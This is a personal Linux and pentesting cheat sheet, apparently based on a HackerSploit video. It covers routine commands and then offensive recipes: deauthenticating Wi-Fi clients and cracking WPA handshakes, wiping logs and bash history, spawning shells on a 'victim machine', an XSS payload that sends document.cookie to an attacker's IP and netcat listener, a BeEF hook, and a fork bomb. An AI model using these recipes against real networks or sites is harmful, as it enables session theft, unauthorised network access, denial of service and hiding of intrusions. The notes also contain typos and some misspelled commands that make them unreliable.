
> # __MyNotes-MyWords__

> # _Linux-Essentials-Notes & MyNotes_

> #  __Author__ : _Rj Raju_

---

> # _Cred's : HackerSploit [ YouTube ](https://youtu.be/1hvVcEhcbLM)_

---
# __File-Permissions__
35:00
```
r = 4 [ r = read ]
w = 2 [ w = write ]
x = 1 [ x = execute ]
4 + 2 + 1 = 7 = all
Example:
chmod 777 -R folder/all-files ( -R recursive )
```
---
# __File Owner Ship__
* __chown &&  chgrp__
```
Examples:
chown (root) (file.name) it change owner as root
chgrp (root) (file.name) it chaneg group as root
sudo chown root file.name
sudo chown username:username /path
sudo chown root:root /path
chgrp root file.name
```
---
# __grep & piping__

59:36

---
# __Finding Files With Locate__

1:06:55

---
# __Enumerating Distribution & Kernel Information__

1:17:38

```
lsb_release -a
cat /etc/issue
cat /etc/os-release
cat /etc/*release
cat /etc/redhat-release
cat /etc/passwd
lscpu
neofetch
uname -a
uname -r
uname -s
uname -p
uname -i
uname -o
who
whoami
```
---
# __Find OverTheWire BanditChallenges__
1:23:32
```
f ==> file
b ==> dir
/ ==> root dir (or) enter path
. ==> current dir
find .. | xarge ==> human readable ASCII TEXT
( -perm ) ==> Permissions ex: -perm 400 ; -perm 4000 -perm 777; -perm 744 
( -size ) ==> size ex: -size +1M; -size +100M .....
( -size ) ==> ex: 1033bytes = -size 1033c
( -name "filename" )
( -iname "FileName" )
( -executable ==> execetable file )
( ! -executable ==> Not execetable file )
( -user username )
( -group groupname )

find / -name "flags" -size +1M
find / -type f -name "flgs"
find / -perm -4000 2>/dev/null 
```
# __OverTheWire BanditChallenges__
1:32:48
```
find . -type f | xargs file
find . -type f -size 1033c ! -executable | xargs file
```
---
# __Shell & Bash Configuration__
1:39:38
```
sh = born shell
bash = born again shell
fish = friendly intreractive shell
zsh  = zee shell
zsh  = ohmyzsh (New Version Of ZSH)
history = GNU History Library
```
__clearing history__
```
cat /dev/null > /home/user/.bash_history`
echo "" > /home/user/.bash_history`
>.bash_history

cat etc/shell  ( valid login shell's ) 
```
* __chsh__ ==> change's the login shell ex: bash to zsh
---
# __Disk Usage__
1:49:55

* __du__
 ```
du ==> disk usage
s ==> summarize
h ==> human readable
t ==> total
```
```
du -sh *
du -sht *
```
* __df__
```
df -h
df -h | grep sd
df -ht ext4
```
---
# __File Compression & Archiving with tar__
1:58:43

* __tar__
```
c ==> compress
v ==> verbose
x ==> extract
f ==> force

tar -cf filename.tar  /filename/
tar -cvf filename.tar  /filename/
tar -xvf filename.tar
```
* __gzip__
```
tar -czf filename.tar.gz /filename/
tar -xzf filename.tar.gz
```
* __bzip2 , unzip ....__
---
# __Users and Groups & Permissions with Visudo__
2:05:45

* __Here admin is a user__

* __-aG ==> all groups__

```
usermod -aG admin admin
```

* __creating user with bash shell__
```
useradd -m -c "user" -s /bin/bash user
```
* __changing passwd__
```
sudo passwd user
```

# __visudo__

```
User priviliges specification
    root    All=(ALL:ALL) All
    user    All=(All) /usr/bin/apt-get
```
__/usr/bin/apt-get__

* __or__

```
User priviliges specification
    root    All=(ALL:ALL) All
    user    All=(All) All
```
---
# __Networking : ifconfig , netstat , netdiscover__
2:24:52

## **Network linux commands**
----------

* __ip route show__
---
_ip route show_ ==> it show's current routing tables
---
-   `hostname`: to print the name of the host, with `-d` option it prints the domain name which the machine belongs to, with `-f` option, it prints the fully qualified domaine name, with –`i`, it prints the ip address of the machine.
-   `ping`: used to cchechk the establishement of the connection and also the speed of that connection, `ping www.google.fr`.
-   `netstat`: list detailed information about connection to and from the host, with `-t` option we list only tcp connections, with u only udp connections and with `-l` we list only listening ports, with -p we list also the pid/program name information.
-   `netstat -c`: display information continiously (live)
-   `netstat -r`: display the kernel routing table.
-   `netstat -ap | grep ssh`: check on which port ssh is running
-   `netstat -s`: print connection statistics.
-   `netstat -lx`: print all unix listening ports.
-   `netstat -i`: show network interfaces, with -e, more extended output.
-   `ifconfig -a`: view all network configuration & setting.
-   `ifconfig eth0`: to view specific network setting.
-   `ifconfig eth0 up`: enabling eth0 interface.
-   `ifconfig eth0 down`: disabling eth0 interface.
-   `nslookup`: to get ip address from dns name or vise-virsa: `nslookup www.google.fr`.
-   `traceroute`: utility to view the number of hopes to reach a given host.



# __ip addr && ifconfig__
```
ip addr
ifconfig

dhclient
```
# __restart network-manager__
```
sudo service network-manager restart
sudo systemctl restart network-manager.service
```
* __netstat__
```
( l ==> LISTENING )
( u ==> UDP CONNECTIONS )
( t ==> TCP CONNECTIONS )
( p ==> PID )

netstat -r ==> it shows routing tables
netstat -r

netstat -t ==> it all tcp connections
netstat -t
```
# __Find LISTENING ports / sockets__
```
netstat -l
netstat -l | grep LISTENING
netstat -lt
netstat -lu
netstat -p
netstat -ltp
netstat -ltp | grep http
```
# __install netdiscover__
```
sudo apt install netdiscover
netdiscover --help
sudo netdiscover -i eth0
( -i ==> interface ex: eth0 , wlan0 ...)
```
# __DNS__
```
sudo nano /etc/resolve.conf
sudo nano /etc/hosts
system-resolve --status
```
---
# __Tor & Proxychains__

2:40:47

* __install tor service__

* __( Tor port 9050 )__
```
sudo apt install tor

sudo systemctl start tor
sudo systemctl status tor
       (or)
service tor start
service tor status
```
# __install Proxychains__
```
sudo apt install proxychains
```
* __configure proxychains__

```
sudo nano /etc/proxychains.conf`

randam_chain
proxy_dns

socks5 127.0.0.1 9050
```
* __run proxychains__

```
ex: proxychains firefox
    proxychains nmap
```
---
# __Service and Process Management ( HTOP & systemctl )__
2:47:29
```
sudo apt install htop

top
htop
free -h ( -h is a human readable )
ps
ps aux ( BSD syntex )
```
# __systemctl__

* __systemctl__ ( it shows all the sevices )

* ex : __systemctl | grep ssh.service__ ( Tab to auto complete )
```
sudo systemctl is-enable ssh.servive
sudo systemctl enable ssh.servive
sudo systemctl diable ssh.servive

sudo systemctl start (service)
sudo systemctl status (service)
sudo systemctl stop (service)
sudo systemctl reload (service)     ( it will reload the config file )
sudo systemctl restart (service)    ( it will restart the service )
ex:
sudo systemctl start apache2

sudo service apache2 start
sudo service apache2 status
sudo service apache2 stop
```
---
# __SSH & SSH Security__
3:04:58
```
sudo apt install openssh-clint
sudo apt install openssh-server

cat /etc/ssh/ssh_config

ssh user@(ip)
ex: ssh admin@127.0.0.1


sudo vim /etc/ssh/sshd_config
change PermitRootLogin no (or) PermitRootLogin yes

sudo passwd -l root ( -l lock )
sudo passwd -S root ( -S status )
sudo passwd --status root` ( --status status )

ssk-heygen -t rsa

ssh-copy-id user@(ip)
sudo systemctl restart sshd.service
```
* __scp__

```
scp file/path user@(ip):/path/to/save
scp user@(ip):/path/to/save
```
---
# __Curl Fundamentals__
3:20:56

```
curl http://127.0.0.1/robots.txt -o file.txt

curl -O http://127.0.0.1/robots.txt

curl -L http://localhost/robots.txt              ( # -L is redirect http & https )
 
curl -I http://localhost/robots.txt              ( # -I is Header )

curl -v http://localhost/robots.txt              ( # -v it shows tls handshake )

curl --data "log=admin&pwd=password" https://wordpress.com/wp-login.php
```
---
# __UFW Firewall__
3:56:40


* ___To be continue ...___


---

> # __MyNotes-MyCheatSheet__
---

# __SSH Port Forwarding__

```
ssh-keygen [ ENTER ] [ ENTER ] [ ENTER ]
ssh -R 80:localhost:(portToForward) localhost.run
```
---

# __WipeOut all.logs__
```
sudo apt install bleachbit
sudo bleachbit -c --preset
```
---
# __Kali NoPassword__

```
sudo dpkg-reconfig kali-grant-root
```
---

# __Wifi-Hack's__

````
iwconfig #it show's interface
airmon-ng (start or stop) (interface) #to start or stop monitermode
airmon-ng (moniterMode interface) #it will display all wifi's network  CTRL+C
airodump-ng -bssid (targetWifiMAC) --channel (ChannelNo.) (interface)  #it moniter all data about TargetWifi CTRL+C
airodump-ng -bssid (targetWifiMAC) --channel (ChannelNo.) --showack -w /path/anyName (interface) #it will capture all date and saved automatically  CTRL+C
---OPEN NEW TERMINAL---
aireplay-ng -0 20 -a (targetWifiMAC) -c (Randam client MACaddrs)(interface) #it will deauth the client and we will get the Wpa_Handshake

     -0 <= is deauth
     -a <= access point
     -c <= client MACaddrs 

aircrack-ng (/aptureFile/path/*.cap) -w /part/wordlist #it will carck passwd
````
* # __airgeddon__

```
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
chmod +x airgeddon.sh
```
---
# __Stabilized shell__
```
python -c 'import pty;pty.spawn("/bin/bash");'  ( victim machine )
export TERM=xterm  ( victim machine )
ctrl + z
stty raw -echo;fg  ( Attacker machine )
```
---
# __Shell Spamming__

```
python -c 'import pty;pty.spawn("/bin/bash");'

echo os.system('/bin/bash')

/bin/bash -i

perl -e 'exec "/bin/bash";'

perl: execc "/bin/bash";

ruby: exec "/bin/bash"

lua: os.execute('/bin/bash')

[ From within IRB ]
exec "/bin/bash"

[ From within vi ]
:!bash

[ From within vi ]
:set shell=/bin/bash:shell

[ From within nmap ]
!sh
```
---
# __HTML Tag's & XSS-Cross-Site-Script__ 
```html
<!---Insert_Image--->
   <!-- img = image URL -->
   <!-- src = source where to store -->
   
<img src="  " >  <!-- # Enter Image URL in Between "  "-->
                <!-- # example : <img src=" htttp://image.com "> -->


<img src="  " width="100" height="500"> <!-- # it will create blank image Because We don't give Image URL -->
                                        <!-- # Enter Image URL in Between "  "  -->
```
```html
<!---Cookie_PopUp--->

<Script>alert(document.cookie)</Script>  <!-- # it will PopUp The document.cookie is a File TO Store 'session id' -->

<Script>new Image().src="http://<IP>/bogus.php?output="+document.cookie;</Script>  <!-- # <IP> = Enter The IP_Address Of Your Systen
                                                                                   # Here : ' bogus.php?output="+document.cookie; ' Will Send The Cookie On Our_Systen
                                                                                   # NOTE : Start Leasioner On Your System
                                                                                   # To Start Leasioner Type Below Command On Your Terminal
                                                                                   # sudo netcat -lvp 80 - Command of Netcat Leasioner
                                                                                   # -l is lesner
                                                                                   # -v is verbost
                                                                                   # -p is port
                                                                                   # 80 is a port of HTTP  -->
```
```html
<!---BEFF_BROWSERS--->

<!--   # Open BEEF_Browser -->
<!--   # Open Target Xss Vulnrabule Site -->
   
<Script src="http://127.0.0.1:30000/hook.js"></Script>  <!--  # Here : 127.0.0.1 is a localhost -->
                                                        <!--  # rePlaace 127.0.0.1 ==> Your IP_Adress -->
```
```html
<!---Video-Tags--->
<video src="" controls=""></video>                            <!--  #video tag  -->
<video src="" poster="thumbnail" controls=""></video>         <!--  # video tag with thumbnail  -->
<video src="" autoplay controls=""></video>                   <!--  # video tag with autoplay  -->
<video src="" loop controls=""></video>                       <!--  # video tag with loop  -->
```
---
> # __END-GAME__
```bash
:(){ :|: & };:
```
---

> # ___My Banner___

```
╔♫═╗╔╗ ♥   
╚╗╔╝║║♫═╦╦╦╔╗
╔╝╚╗♫╚╣║║║║╔╣
╚═♫╝╚═╩═╩♫╩═╝


\ \

  \ \                     /  \

    \ \                 / / \ \                 / /

      \ \             / /     \ \             / /

        \ \         / /         \ \         / /

          \ \     / /             \ \     / /

            \ \ / /       /\       \ \ / /

              \/ /      / /\ \      \/ /

              / /\    / /    \ \    / /\

            / / \ \/ /        \ \/ /  \ \

                   \ /             \ /      \ \

                                                 \ \
                                                 
```




---
